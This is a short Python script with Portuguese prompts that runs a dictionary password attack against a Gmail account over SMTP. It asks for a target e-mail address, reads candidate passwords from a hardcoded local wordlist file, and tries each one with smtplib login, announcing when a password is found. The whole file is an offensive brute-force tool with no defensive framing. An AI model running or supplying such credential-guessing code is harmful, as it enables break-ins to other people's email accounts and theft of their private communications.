import smtplib
import email.utils

smtpcliente = smtplib.SMTP('smtp.gmail.com', 587)
smtpcliente.ehlo()
smtpcliente.starttls()

user = input('Entre com o e-mail alvo:')
passwfile = input('Entre com o arquivo de dicionário: ')
passwfile = open(r'C:\Users\felipe\PycharmProjects\WEB_SCRAPING_PYTHON_SELENIUM\wlist.txt')

for password in passwfile:
    try:
            smtpcliente.login(user, password)
            print('Senha encontrada %s:' % password)
            break;
    except smtplib.SMTPAuthenticationError:
            print('Senha incorreta %s:' % password)

